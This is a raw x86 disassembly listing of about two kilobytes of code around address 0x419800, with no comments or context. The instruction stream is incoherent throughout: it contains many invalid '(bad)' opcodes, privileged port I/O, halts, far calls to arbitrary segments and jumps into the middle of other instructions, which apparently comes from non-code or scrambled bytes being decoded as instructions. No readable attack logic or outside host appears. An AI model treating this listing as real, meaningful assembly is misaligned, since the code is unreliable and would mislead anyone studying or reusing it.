  41977a:	xor    al,0x4c
  41977c:	in     al,dx
  41977d:	push   edx
  41977e:	xchg   ebx,eax
  41977f:	mov    edx,0xe5e0e016
  419784:	dec    edx
  419785:	lock sub DWORD PTR [edi+edx*8],ebx
  419789:	inc    esi
  41978a:	cmp    al,0xeb
  41978c:	cmp    ah,BYTE PTR [edx-0x6c]
  41978f:	test   al,0xe2
  419791:	rcr    BYTE PTR [edx+eiz*8],cl
  419794:	xchg   esp,eax
  419795:	pop    ecx
  419796:	mov    dl,0xca
  419798:	mul    DWORD PTR [esi]
  41979a:	fcomi  st,st(6)
  41979c:	mov    WORD PTR [edi+0x43a59897],cs
  4197a2:	daa    
  4197a3:	test   edx,eax
  4197a5:	int    0xc6
  4197a7:	xor    ch,bl
  4197a9:	dec    esi
  4197aa:	dec    esp
  4197ab:	std    
  4197ac:	mov    fs:0x8ab3d92d,al
  4197b2:	test   dh,0xe7
  4197b5:	js     0x419738
  4197b7:	mov    esp,es
  4197b9:	mov    dl,0x34
  4197bb:	dec    ecx
  4197bc:	ret    0xba63
  4197bf:	and    ebx,ebx
  4197c1:	xchg   edx,eax
  4197c2:	mov    BYTE PTR [eax+0x57c8da23],bh
  4197c8:	xchg   edi,eax
  4197c9:	adc    BYTE PTR [ebx-0x479096b8],bl
  4197cf:	ins    DWORD PTR es:[edi],dx
  4197d0:	cmp    DWORD PTR [edi-0x43],0x82f9ef84
  4197d7:	xchg   ebx,eax
  4197d8:	xchg   edi,eax
  4197d9:	xchg   ebx,eax
  4197da:	sbb    ebp,DWORD PTR [ebp+0x154cfa14]
  4197e0:	daa    
  4197e1:	repz shl DWORD PTR [esi+0x53a89c1],1
  4197e8:	jg     0x419818
  4197ea:	mov    ecx,0x437fd734
  4197ef:	sbb    al,0xbf
  4197f1:	xchg   BYTE PTR [eax+0x16],dl
  4197f4:	dec    edi
  4197f5:	fcom   DWORD PTR [eax+0x1e]
  4197f8:	adc    dh,BYTE PTR [ebp-0x74]
  4197fb:	sahf   
  4197fc:	xchg   ebx,eax
  4197fd:	or     ebp,DWORD PTR [esi+0x1fa59c75]
  419803:	pop    ecx
  419804:	jp     0x419875
  419806:	dec    edx
  419807:	push   ss
  419808:	pop    esi
  419809:	sub    BYTE PTR [ecx+0x784e74da],dh
  41980f:	ret    
  419810:	push   0x2b0ead22
  419815:	jb     0x419879
  419817:	lahf   
  419818:	or     dl,BYTE PTR [edi+0x602e7556]
  41981e:	push   esp
  41981f:	fs mov ecx,0xa0224eb3
  419825:	jl     0x41982a
  419827:	ficomp DWORD PTR [edx]
  419829:	cld    
  41982a:	add    ecx,DWORD PTR [ebx-0x192cfce6]
  419830:	jl     0x41989a
  419832:	sub    eax,0xb48d5c17
  419837:	jl     0x41982d
  419839:	sbb    eax,0x1740e425
  41983e:	hlt    
  41983f:	mov    dh,dh
  419841:	jns    0x4197ed
  419843:	jne    0x41981f
  419845:	sbb    cl,ah
  419847:	call   0xf188:0xcd33bd9e
  41984e:	lods   eax,DWORD PTR ds:[esi]
  41984f:	and    bl,dl
  419851:	mov    ebx,DWORD PTR [ebp+0x5e]
  419854:	mov    esi,0x9b226ab7
  419859:	(bad)  
  41985a:	fld    DWORD PTR [esi]
  41985c:	les    ebx,FWORD PTR [ebp+0x41]
  41985f:	das    
  419860:	sbb    edi,DWORD PTR [ebp+0x39]
  419863:	pop    ebx
  419864:	ja     0x41985d
  419866:	test   DWORD PTR [eax+0xe],ebx
  419869:	adc    al,0xc0
  41986b:	test   al,0x0
  41986d:	jne    0x419889
  41986f:	adc    ch,BYTE PTR ds:0x4a441631
  419875:	add    al,0x48
  419877:	mov    cl,0x33
  419879:	mov    dh,0x1b
  41987b:	mov    dh,0xad
  41987d:	out    dx,al
  41987e:	xchg   DWORD PTR [esi*2-0x555934d9],edi
  419885:	icebp  
  419886:	hlt    
  419887:	dec    eax
  419888:	xchg   esi,eax
  419889:	lock scas eax,DWORD PTR es:[edi]
  41988b:	in     eax,0xfa
  41988d:	dec    ecx
  41988e:	ror    WORD PTR [ecx+0x76],0x37
  419893:	aas    
  419894:	pop    ebx
  419895:	in     eax,0x7e
  419897:	add    DWORD PTR [edi-0x37],edx
  41989a:	hlt    
  41989b:	push   ax
  41989d:	jns    0x41983f
  41989f:	xchg   edx,eax
  4198a0:	xor    esi,DWORD PTR [ebp+0x39fd2717]
  4198a6:	push   0xea4d9a05
  4198ab:	popa   
  4198ac:	or     bh,BYTE PTR [esp+ecx*4+0x147be035]
  4198b3:	sahf   
  4198b4:	stos   BYTE PTR es:[edi],al
  4198b5:	pop    eax
  4198b6:	(bad)  
  4198b7:	(bad)  
  4198b8:	in     al,dx
  4198b9:	sbb    BYTE PTR [ebx],cl
  4198bb:	mov    al,0xf0
  4198bd:	sub    BYTE PTR [edx],ch
  4198bf:	or     dl,ch
  4198c1:	ror    bh,0xd
  4198c4:	outs   dx,BYTE PTR ds:[esi]
  4198c5:	jo     0x4198c5
  4198c7:	and    BYTE PTR [edx+0x131d8a60],al
  4198cd:	fs in  al,dx
  4198cf:	lods   eax,DWORD PTR fs:[esi]
  4198d1:	add    ch,ch
  4198d3:	xor    eax,0x2cc6e41e
  4198d8:	das    
  4198d9:	mov    dl,0x5c
  4198db:	mov    ds:0xccba9c09,al
  4198e0:	(bad)  [ebp+ebx*1+0x6e]
  4198e4:	fnsave [ecx]
  4198e6:	and    eax,0x42c2d6e8
  4198eb:	or     eax,0xaf42e4f3
  4198f0:	sbb    al,ch
  4198f2:	mov    al,ds:0x45eb9157
  4198f7:	shr    DWORD PTR [esi+edi*8],cl
  4198fa:	cmp    al,0x35
  4198fc:	push   eax
  4198fd:	test   al,0x13
  4198ff:	jg     0x419920
  419901:	or     eax,0x7a8a5c70
  419906:	pop    ecx
  419907:	cmp    esp,DWORD PTR [esi+0x9]
  41990a:	mov    ds:0x607240b2,al
  41990f:	mov    edx,0xcc520e34
  419914:	cld    
  419915:	rol    DWORD PTR [edi-0x5c],cl
  419918:	repnz dec ebp
  41991a:	jp     0x419919
  41991c:	inc    esi
  41991d:	stos   DWORD PTR es:[edi],eax
  41991e:	lods   al,BYTE PTR ds:[esi]
  41991f:	sbb    eax,0x22c101be
  419924:	imul   edi,DWORD PTR [edx-0x53],0x582a45fe
  41992b:	scas   al,BYTE PTR es:[edi]
  41992c:	mov    bl,0x72
  41992e:	rcr    BYTE PTR [ecx+0x9],cl
  419931:	push   esp
  419932:	outs   dx,DWORD PTR ds:[esi]
  419933:	fwait
  419934:	das    
  419935:	pop    ebx
  419936:	jb     0x41991c
  419938:	dec    eax
  419939:	mov    cl,0x77
  41993b:	or     BYTE PTR [ecx],cl
  41993d:	cmc    
  41993e:	add    eax,0x2abcc522
  419943:	mov    ebp,0xa8e47648
  419948:	mov    esp,0x6303be3d
  41994d:	das    
  41994e:	loope  0x4198ed
  419950:	not    BYTE PTR [ebx-0x23792471]
  419956:	pop    es
  419957:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419958:	out    dx,eax
  419959:	jp     0x419998
  41995b:	stos   DWORD PTR es:[edi],eax
  41995c:	je     0x41999e
  41995e:	xchg   ebx,eax
  41995f:	test   eax,0xf0059753
  419964:	test   eax,0xa6a195a4
  419969:	aad    0x1b
  41996b:	js     0x41993d
  41996d:	or     bh,al
  41996f:	outs   dx,DWORD PTR ds:[esi]
  419970:	dec    edi
  419971:	jg     0x4199a9
  419973:	sub    al,0x16
  419975:	test   DWORD PTR [ebx],edx
  419977:	fcom   QWORD PTR [edi-0x1629b40a]
  41997d:	into   
  41997e:	rcr    DWORD PTR [ecx+eax*2],0xfd
  419982:	xor    al,0xd1
  419984:	push   ebp
  419985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419986:	sub    ch,al
  419988:	xchg   DWORD PTR [ebx-0x77c4a9ec],eax
  41998e:	es nop
  419990:	pusha  
  419991:	gs (bad) 
  419993:	push   esi
  419994:	ja     0x419982
  419996:	xchg   BYTE PTR [edi],dl
  419998:	push   edx
  419999:	push   ebp
  41999a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41999b:	jae    0x4199da
  41999d:	push   0xffffffb0
  41999f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199a0:	inc    ebx
  4199a1:	int    0x92
  4199a3:	mov    bh,0xf0
  4199a5:	lds    edi,FWORD PTR [ebx+0x71]
  4199a8:	push   es
  4199a9:	and    bl,BYTE PTR [ebp+0x2c26984f]
  4199af:	mov    ds:0xbbd3bf3f,eax
  4199b4:	mov    cl,BYTE PTR [edx-0x4c]
  4199b7:	test   BYTE PTR ds:[ebp+ebp*8+0xe555da],ah
  4199bf:	adc    DWORD PTR [ebp+0x53be3af8],ecx
  4199c5:	stos   DWORD PTR es:[edi],eax
  4199c6:	push   cs
  4199c7:	lods   eax,DWORD PTR ds:[esi]
  4199c8:	rep ins DWORD PTR es:[edi],dx
  4199ca:	pop    edi
  4199cb:	in     eax,0x8e
  4199cd:	(bad)  
  4199ce:	stos   BYTE PTR es:[edi],al
  4199cf:	mov    esp,0x7e6dec9b
  4199d4:	xor    ebp,esi
  4199d6:	pop    es
  4199d7:	jecxz  0x419979
  4199d9:	imul   ecx,DWORD PTR [edx],0x43dd32f6
  4199df:	repz fbld TBYTE PTR [ebx-0x78]
  4199e3:	adc    ah,BYTE PTR [ebx+0x77ba387e]
  4199e9:	mov    al,0x61
  4199eb:	into   
  4199ec:	jecxz  0x419a4b
  4199ee:	add    esi,edi
  4199f0:	aaa    
  4199f1:	and    BYTE PTR [edi+0x51],cl
  4199f4:	jmp    0x419a6b
  4199f6:	mov    ds:0xcf04c844,eax
  4199fb:	jle    0x41999b
  4199fd:	ret    0x79c0
  419a00:	and    bh,BYTE PTR [ecx-0x7321090f]
  419a06:	pop    eax
  419a07:	mov    WORD PTR [eax-0x532cbf6d],ss
  419a0d:	es jns 0x4199a6
  419a10:	dec    edi
  419a11:	scas   al,BYTE PTR es:[edi]
  419a12:	or     DWORD PTR [ecx-0x57a19ccd],ecx
  419a18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a19:	push   esp
  419a1a:	sub    BYTE PTR [edi-0x3e8cf445],bl
  419a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a21:	(bad)  
  419a24:	ins    BYTE PTR es:[edi],dx
  419a25:	or     bh,BYTE PTR [edi+0x4057296a]
  419a2b:	imul   edx,ecx,0x936f0cd9
  419a31:	test   al,0x71
  419a33:	push   eax
  419a34:	jb     0x419a4a
  419a36:	hlt    
  419a37:	dec    eax
  419a38:	pop    es
  419a39:	sti    
  419a3a:	cmp    eax,0x4f1eb8d0
  419a3f:	and    ch,al
  419a41:	loope  0x419a53
  419a43:	mov    dh,0x98
  419a45:	fs cmp esi,ecx
  419a48:	ret    0xf9ae
  419a4b:	push   ss
  419a4c:	xchg   ebx,eax
  419a4d:	jae    0x419a4c
  419a4f:	sub    edx,DWORD PTR [ebp+0x3c]
  419a52:	dec    dx
  419a54:	(bad)
  419a58:	cmp    ecx,DWORD PTR [ebx]
  419a5a:	in     al,dx
  419a5b:	test   eax,0x16bdb490
  419a60:	and    DWORD PTR [ebp+0x2262f3c1],esi
  419a66:	ret    
  419a67:	push   cs
  419a68:	out    0x24,eax
  419a6a:	xor    BYTE PTR [ebp-0x457d1086],bh
  419a70:	push   ss
  419a71:	cdq    
  419a72:	inc    edi
  419a73:	and    dh,ah
  419a75:	jnp    0x419a0d
  419a77:	jno    0x419af7
  419a79:	aam    0xf
  419a7b:	pop    ds
  419a7c:	dec    edi
  419a7d:	xchg   ebp,eax
  419a7e:	and    edx,DWORD PTR [eax-0x30]
  419a81:	fs mov ebx,0xc6fde4ab
  419a87:	adc    al,BYTE PTR [ebp+0xefadf10]
  419a8d:	outs   dx,DWORD PTR ds:[esi]
  419a8e:	cld    
  419a8f:	fwait
  419a90:	test   BYTE PTR [ebx+0x34],dl
  419a93:	and    eax,0x5277d6aa
  419a98:	jecxz  0x419a55
  419a9a:	cmc    
  419a9b:	mov    ecx,0x72479bce
  419aa0:	ficomp DWORD PTR [edi]
  419aa2:	mov    edi,0xe4bf5e4a
  419aa7:	lods   al,BYTE PTR ds:[esi]
  419aa8:	mov    ds:0xd48d7fae,eax
  419aad:	ins    BYTE PTR es:[edi],dx
  419aae:	pushf  
  419aaf:	push   edi
  419ab0:	rol    DWORD PTR [ebp-0x7d15ed25],cl
  419ab6:	mov    ebp,0x9bc69edd
  419abb:	dec    esp
  419abc:	stos   BYTE PTR es:[edi],al
  419abd:	dec    ecx
  419abe:	or     edx,ebp
  419ac0:	sub    DWORD PTR [ecx-0x5e],esp
  419ac3:	xor    DWORD PTR [ebp-0x116c6dcc],ecx
  419ac9:	mov    esi,0x42e4f3fe
  419ace:	stc    
  419acf:	fist   WORD PTR [edx+0x76]
  419ad2:	add    DWORD PTR [ecx-0x67],eax
  419ad5:	into   
  419ad6:	mov    bl,0x2d
  419ad8:	outs   dx,BYTE PTR ds:[esi]
  419ad9:	dec    edx
  419ada:	jno    0x419af0
  419adc:	fsubr  DWORD PTR [ecx-0x68748f1a]
  419ae2:	push   edx
  419ae3:	adc    DWORD PTR [eax-0x224528fc],0xd3a6d331
  419aed:	cmp    eax,DWORD PTR ss:[ecx]
  419af0:	out    0xc2,al
  419af2:	shl    ebp,0xa7
  419af5:	dec    esi
  419af6:	daa    
  419af7:	call   0x2f31:0x4950d208
  419afe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419aff:	cmp    al,0x8e
  419b01:	or     al,0xc6
  419b03:	pop    ss
  419b04:	lds    edx,FWORD PTR [edi]
  419b06:	add    edx,esi
  419b08:	and    edx,ebx
  419b0a:	mov    ebp,0x584cffe7
  419b0f:	push   es
  419b10:	int3   
  419b11:	mov    ah,0x5
  419b13:	lods   al,BYTE PTR ds:[esi]
  419b14:	ins    BYTE PTR es:[edi],dx
  419b15:	(bad)  
  419b16:	in     al,0xed
  419b18:	aas    
  419b19:	jg     0x419aca
  419b1b:	mov    esi,0xf6f4e91a
  419b20:	mov    al,ds:0xef0ec41d
  419b25:	push   ebx
  419b26:	call   DWORD PTR [edx+0x57]
  419b29:	push   esi
  419b2a:	and    al,0x31
  419b2c:	arpl   WORD PTR [ebx+0x3cbe119b],bp
  419b32:	addr16 inc esi
  419b34:	jne    0x419b9b
  419b36:	shr    DWORD PTR [ecx],cl
  419b38:	and    al,0xa9
  419b3a:	mov    dl,0xb9
  419b3c:	inc    ecx
  419b3d:	loop   0x419ae2
  419b3f:	add    eax,0xf10945e9
  419b44:	ins    BYTE PTR es:[edi],dx
  419b45:	sahf   
  419b46:	xor    BYTE PTR [esi+0x77],dl
  419b49:	mov    dh,0x96
  419b4b:	mov    BYTE PTR [ecx-0xb43b6b1],bh
  419b51:	outs   dx,BYTE PTR ds:[esi]
  419b52:	test   BYTE PTR [ebx-0x20],ah
  419b55:	cmp    esp,DWORD PTR [edx+0x7b10d97c]
  419b5b:	popa   
  419b5c:	por    mm7,QWORD PTR [ebx]
  419b5f:	xchg   ebp,eax
  419b60:	(bad)  
  419b61:	in     eax,dx
  419b62:	dec    edx
  419b63:	test   eax,0x35236c23
  419b68:	adc    eax,0x4f2296fd
  419b6d:	add    ebp,DWORD PTR [esp+ebp*4]
  419b70:	aaa    
  419b71:	mov    DWORD PTR fs:0x40f7f98,esi
  419b78:	inc    ebp
  419b79:	addr16 lahf 
  419b7b:	call   0xf42a:0x73cb2c06
  419b82:	mov    dl,0x6f
  419b84:	cld    
  419b85:	mov    ah,0xc3
  419b87:	and    dh,BYTE PTR [edx-0x73]
  419b8a:	and    DWORD PTR [ecx-0x46],ebp
  419b8d:	inc    edx
  419b8e:	mov    dh,0xc9
  419b90:	out    0xe8,eax
  419b92:	ret    0x21fe
  419b95:	mov    ebp,DWORD PTR [ebx+ecx*2]
  419b98:	add    cl,BYTE PTR [edx-0x9de2b06]
  419b9e:	pop    es
  419b9f:	ds imul esi,ebx,0xffffffe5
  419ba3:	fdivp  st(7),st
  419ba5:	or     BYTE PTR [edx],bl
  419ba7:	or     ebp,DWORD PTR [esi-0x6e4719dc]
  419bad:	add    al,0x42
  419baf:	mov    ch,0x57
  419bb1:	add    al,0x81
  419bb3:	xor    ch,BYTE PTR [ebx-0xf]
  419bb6:	jb     0x419c1a
  419bb8:	mov    ecx,0xe7e7d6a2
  419bbd:	retf   
  419bbe:	fidivr DWORD PTR [edx-0x16]
  419bc1:	nop
  419bc2:	repz fcmovnbe st,st(2)
  419bc5:	iret   
  419bc6:	xor    cl,bh
  419bc8:	fst    QWORD PTR es:[edx]
  419bcb:	syscall 
  419bcd:	out    0x44,eax
  419bcf:	mov    dl,BYTE PTR [ecx]
  419bd1:	int    0x1b
  419bd3:	dec    ecx
  419bd4:	add    eax,0x8fc8c2be
  419bd9:	or     ebx,ecx
  419bdb:	stos   DWORD PTR es:[edi],eax
  419bdc:	and    eax,0xd8467004
  419be1:	jns    0x419ba9
  419be3:	hlt    
  419be4:	sti    
  419be5:	vpsrad xmm2,xmm0,xmm5
  419be9:	xchg   BYTE PTR [eax],bh
  419beb:	inc    esp
  419bec:	dec    esi
  419bed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bee:	test   DWORD PTR [esi-0x4bfe1bf6],ebx
  419bf4:	nop
  419bf5:	adc    cl,bl
  419bf7:	aam    0xab
  419bf9:	lahf   
  419bfa:	mov    esp,DWORD PTR [edx+0x1e919103]
  419c00:	cwde   
  419c01:	and    al,0x36
  419c03:	cmp    ch,BYTE PTR [ebx]
  419c05:	jno    0x419c2b
  419c07:	inc    esi
  419c08:	xor    ecx,ecx
  419c0a:	mov    dh,0x6d
  419c0c:	bound  ebx,QWORD PTR [ebx]
  419c0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c0f:	cmp    DWORD PTR [eax-0x64],0x4e
  419c13:	jmp    0x4c9f:0x3e209e62
  419c1a:	cdq    
  419c1b:	add    edi,DWORD PTR [ebx+ecx*4]
  419c1e:	sub    DWORD PTR [edx+0x0],edx
  419c21:	inc    eax
  419c22:	mov    eax,0x116547f1
  419c27:	push   ebp
  419c28:	inc    edx
  419c29:	xor    eax,0x94a70f8e
  419c2e:	push   cs
  419c2f:	push   eax
  419c30:	pause  
  419c32:	loop   0x419c29
  419c34:	scas   eax,DWORD PTR es:[edi]
  419c35:	push   ebx
  419c36:	push   0xe3d0f769
  419c3b:	loop   0x419c1f
  419c3d:	pop    ss
  419c3e:	pop    eax
  419c3f:	scas   eax,DWORD PTR es:[edi]
  419c40:	cwde   
  419c41:	dec    eax
  419c42:	xchg   DWORD PTR [ebx+0x60],edx
  419c45:	adc    cl,bl
  419c47:	dec    esp
  419c48:	xor    DWORD PTR [ebp+0x62],esp
  419c4b:	or     DWORD PTR [ebp-0x22],esi
  419c4e:	sbb    ch,BYTE PTR [edx-0x605157c1]
  419c54:	rcr    BYTE PTR cs:[ecx-0x2325fe07],cl
  419c5b:	ds and al,0x5e
  419c5e:	sahf   
  419c5f:	xor    al,0x7b
  419c61:	xchg   edi,eax
  419c62:	gs (bad) 
  419c64:	xchg   ebx,eax
  419c65:	add    eax,0x2c6b3ec
  419c6a:	in     eax,0xd5
  419c6c:	aam    0x76
  419c6e:	in     eax,0x3e
  419c70:	mul    DWORD PTR ds:0x39c7c689
  419c76:	ror    BYTE PTR [eax-0x2131d702],0x37
  419c7d:	loop   0x419cee
  419c7f:	push   esp
  419c80:	jg     0x419c15
  419c82:	(bad)  
  419c83:	push   0xb9cd1c59
  419c88:	cmp    BYTE PTR [ecx],al
  419c8a:	and    DWORD PTR [edi],0xd32f1f1c
  419c90:	stc    
  419c91:	or     eax,0x522f252d
  419c96:	out    dx,al
  419c97:	lods   al,BYTE PTR ds:[esi]
  419c98:	mov    dh,0xf0
  419c9a:	and    eax,0xd4cc53b6
  419c9f:	fucomi st,st(1)
  419ca1:	hlt    
  419ca2:	enter  0x9d67,0x13
  419ca6:	mov    ah,bh
  419ca8:	out    dx,al
  419ca9:	stos   DWORD PTR es:[edi],eax
  419caa:	sub    al,0x73
  419cac:	mov    edx,DWORD PTR [edx+0x7]
  419caf:	int3   
  419cb0:	adc    esp,eax
  419cb2:	and    DWORD PTR [edi-0x4b16c063],ebx
  419cb8:	inc    esp
  419cb9:	adc    DWORD PTR [ebx],edi
  419cbb:	push   edx
  419cbc:	fiadd  DWORD PTR [ebx-0x4ab5a627]
  419cc2:	inc    edi
  419cc3:	or     DWORD PTR [esi+0x1],edi
  419cc6:	ds pop esi
  419cc8:	sbb    DWORD PTR [ecx+0x202ee624],eax
  419cce:	lea    ebx,[ebp+0x21679848]
  419cd4:	ror    BYTE PTR [eax],1
  419cd6:	xor    ebx,ebx
  419cd8:	fstp   QWORD PTR [esp+edx*1-0x2d67426c]
  419cdf:	daa    
  419ce0:	aaa    
  419ce1:	test   eax,0x589be887
  419ce6:	lock pop eax
  419ce8:	or     edi,0xffffff95
  419ceb:	jl     0x419c99
  419ced:	aaa    
  419cee:	mov    esi,0x8edcd76d
  419cf3:	push   esi
  419cf4:	sbb    DWORD PTR [ebx+0x3f],esp
  419cf7:	in     eax,0x1a
  419cf9:	sbb    ecx,0x5033a94f
  419cff:	inc    eax
  419d00:	call   0xa0e1:0x8b447853
  419d07:	xchg   ecx,eax
  419d08:	hlt    
  419d09:	inc    ecx
  419d0a:	call   0x5866:0xadc377f4
  419d11:	std    
  419d12:	iret   
  419d13:	cmp    BYTE PTR [edi],dh
  419d15:	mov    ch,0xce
  419d17:	mov    esp,0x42a36310
  419d1c:	cdq    
  419d1d:	div    DWORD PTR [ecx+0x71]
  419d20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d21:	mov    ah,BYTE PTR [ecx]
  419d23:	cdq    
  419d24:	stos   BYTE PTR es:[edi],al
  419d25:	mov    esi,0x2bc1028
  419d2a:	inc    esi
  419d2b:	lahf   
  419d2c:	aam    0x95
  419d2e:	fdivr  DWORD PTR [ecx+0x672b1598]
  419d34:	mov    al,0x74
  419d36:	xor    edx,edi
  419d38:	ins    BYTE PTR es:[edi],dx
  419d39:	inc    edi
  419d3a:	xchg   esp,eax
  419d3b:	push   edx
  419d3c:	inc    ebp
  419d3d:	sbb    bp,cx
  419d40:	fbstp  TBYTE PTR [edi-0x27]
  419d43:	loop   0x419da1
  419d45:	das    
  419d46:	dec    ecx
  419d47:	lea    ecx,ds:0x47bda55e
  419d4d:	into   
  419d4e:	aad    0xdf
  419d50:	pop    ecx
  419d51:	je     0x419d16
  419d53:	dec    esp
  419d54:	push   eax
  419d55:	movntq QWORD PTR [eax],mm2
  419d58:	adc    al,0x3f
  419d5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d5b:	test   DWORD PTR fs:[ebx],edx
  419d5e:	or     eax,0x1970c9d0
  419d63:	add    eax,0x338c564d
  419d68:	push   0xffffffa0
  419d6a:	mov    ecx,0x25a0e0e4
  419d6f:	loopne 0x419d7d
  419d71:	(bad)  
  419d72:	cli    
  419d73:	sub    al,0xec
  419d75:	stc    
  419d76:	outs   dx,DWORD PTR ds:[esi]
  419d77:	pushf  
  419d78:	inc    ebp
  419d79:	mov    esp,DWORD PTR [edx]
  419d7b:	iret   
  419d7c:	retf   0x70df
  419d7f:	xlat   BYTE PTR ds:[ebx]
  419d80:	dec    esi
  419d81:	aas    
  419d82:	and    BYTE PTR [edi+eax*2-0x5907eb3],dh
  419d89:	xor    ch,0xa2
  419d8c:	cmp    DWORD PTR [ebp+0x128b6745],edx
  419d92:	fdiv   DWORD PTR [eax]
  419d94:	xor    edi,DWORD PTR [esi-0x6d]
  419d97:	call   0xc0a2fa82
  419d9c:	icebp  
  419d9d:	cmc    
  419d9e:	jge    0x419dae
  419da0:	pop    ds
  419da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419da3:	cmp    ah,BYTE PTR [ecx-0x6a]
  419da6:	sti    
  419da7:	(bad)  
  419da8:	ror    DWORD PTR [edi],cl
  419daa:	mov    ebp,0xa65c45d2
  419daf:	icebp  
  419db0:	cld    
  419db1:	jl     0x419d71
  419db3:	mov    ebx,DWORD PTR [ecx]
  419db5:	mov    DWORD PTR [edi+ecx*2],edi
  419db8:	mov    al,bh
  419dba:	jl     0x419dff
  419dbc:	sbb    BYTE PTR [ebp-0x216c36aa],ch
  419dc2:	sub    DWORD PTR [eax-0x5f],ebp
  419dc5:	sahf   
  419dc6:	sub    eax,0xf7486bec
  419dcb:	stos   BYTE PTR es:[edi],al
  419dcc:	jns    0x419de1
  419dce:	adc    eax,0x366bbae4
  419dd3:	(bad)  [edx-0x10]
  419dd6:	or     al,0x78
  419dd8:	mov    ch,0x2f
  419dda:	pop    ebx
  419ddb:	outs   dx,BYTE PTR ds:[esi]
  419ddc:	div    bl
  419dde:	jo     0x419e32
  419de0:	push   0x29a0e36e
  419de5:	ret    0xb7e0
  419de8:	mov    eax,ds:0xaccce6be
  419ded:	pop    ebx
  419dee:	or     al,0x4f
  419df0:	imul   eax,DWORD PTR [esi-0x6],0x10
  419df4:	fcom   st(3)
  419df6:	retf   0x2e4a
  419df9:	cmp    al,0xd5
  419dfb:	lds    esi,FWORD PTR [edx-0x3a]
  419dfe:	mov    ecx,0xfe9a64d6
  419e03:	sar    DWORD PTR [edi],1
  419e05:	je     0x419e1f
  419e07:	paddq  mm6,QWORD PTR [ebx+0x3614371a]
  419e0e:	sub    edx,DWORD PTR [ebx-0x1ab49118]
  419e14:	mov    edi,0x8dcdec7a
  419e19:	add    eax,0xef3a7359
  419e1e:	cmp    al,bh
  419e20:	dec    ebx
  419e21:	mov    ah,0x8
  419e23:	leave  
  419e24:	push   edi
  419e25:	mov    dl,0x10
  419e27:	mov    bh,0xe
  419e29:	xchg   ebp,eax
  419e2a:	jo     0x419dda
  419e2c:	in     eax,0x1
  419e2e:	add    al,0x55
  419e30:	mov    cl,ah
  419e32:	adc    bl,BYTE PTR [ebx+0x71059c86]
  419e38:	nop
  419e39:	out    dx,al
  419e3a:	jecxz  0x419dcf
  419e3c:	ja     0x419e6b
  419e3e:	or     eax,0x57628b14
  419e43:	je     0x419e9b
  419e45:	or     DWORD PTR [edi],esp
  419e47:	sub    bh,BYTE PTR [esi]
  419e49:	call   0x1483:0xb891afe2
  419e50:	daa    
  419e51:	push   esp
  419e52:	pop    es
  419e53:	add    edi,DWORD PTR [edx+0x2dc712e3]
  419e59:	test   BYTE PTR [edi+0x7e],0x64
  419e5d:	push   0xfffffff2
  419e5f:	adc    BYTE PTR [edi],dh
  419e61:	ret    
  419e62:	outs   dx,BYTE PTR ds:[esi]
  419e63:	mov    ebp,0x41b36547
  419e68:	aad    0xf4
  419e6a:	(bad)  
  419e6b:	or     al,0xf3
  419e6d:	cmp    BYTE PTR [edx-0x70],bl
  419e70:	or     BYTE PTR [edi-0x4d94e888],bl
  419e76:	(bad)  
  419e79:	sti    
  419e7a:	sbb    eax,0x34eef8e6
  419e7f:	mov    edx,ebx
  419e81:	or     eax,DWORD PTR [esi-0x6e]
  419e84:	mov    cl,0xf9
  419e86:	fist   DWORD PTR [ebp+eiz*2-0x53]
  419e8a:	mov    ah,0x64
  419e8c:	(bad)  
  419e8d:	out    dx,eax
  419e8e:	shl    bh,0x79
  419e91:	xchg   ecx,eax
  419e92:	shr    BYTE PTR [edx+edi*8],cl
  419e95:	ds jl  0x419e1b
  419e98:	xor    al,0x5f
  419e9a:	aam    0x0
  419e9c:	jo     0x419eaa
  419e9e:	enter  0x6e58,0xdf
  419ea2:	(bad)
  419ea6:	inc    edx
  419ea7:	mov    ch,0x8a
  419ea9:	arpl   WORD PTR [edi+0x3e42314b],si
  419eaf:	add    DWORD PTR [edx-0x26874471],esi
  419eb5:	xchg   edx,eax
  419eb6:	xor    DWORD PTR [edx+0x69],eax
  419eb9:	sbb    dh,BYTE PTR [ebx+ebp*8]
  419ebc:	shl    BYTE PTR [esi+0x17f1103],1
  419ec2:	inc    ebx
  419ec3:	xchg   edi,eax
  419ec4:	or     BYTE PTR [esi+edx*1+0xc],ch
  419ec8:	std    
  419ec9:	mov    bh,dl
  419ecb:	mov    dl,0x76
  419ecd:	jle    0x419ea0
  419ecf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ed0:	shl    ebx,0x67
  419ed3:	cmp    cl,BYTE PTR [ebx-0x64b2aada]
  419ed9:	ror    edi,cl
  419edb:	(bad)  
  419edc:	fadd   DWORD PTR [eax-0x23]
  419edf:	or     eax,0xc7a0a867
  419ee4:	and    DWORD PTR [eax-0x32],edx
  419ee7:	pop    ds
  419ee8:	ror    BYTE PTR [ebx+0x67],cl
  419eeb:	rcl    BYTE PTR [esi+0x31],0x5d
  419eef:	stos   BYTE PTR es:[edi],al
  419ef0:	ds push ds
  419ef2:	je     0x419ea5
  419ef4:	fnstcw WORD PTR [eax-0x1e]
  419ef7:	dec    esp
  419ef8:	mov    ch,BYTE PTR [ebx+0x56cd99e5]
  419efe:	sbb    DWORD PTR [eax],esi
  419f00:	or     bh,BYTE PTR [ebp-0x24]
  419f03:	dec    DWORD PTR cs:[eax-0x6b]
  419f07:	shl    DWORD PTR [eax+0x4634b505],0x4d
  419f0e:	mov    ecx,0x9e73af18
  419f13:	iret   
  419f14:	and    eax,DWORD PTR [edx*2-0x2c8258bf]
  419f1b:	ss mov dh,0xd7
  419f1e:	dec    esp
  419f1f:	mov    eax,0xc5b4fc42
  419f24:	push   eax
  419f25:	mov    cl,0xbd
  419f27:	retf   
  419f28:	rcl    DWORD PTR [ecx],cl
  419f2a:	adc    dl,ah
  419f2c:	xor    BYTE PTR [ebx-0x429521e4],ch
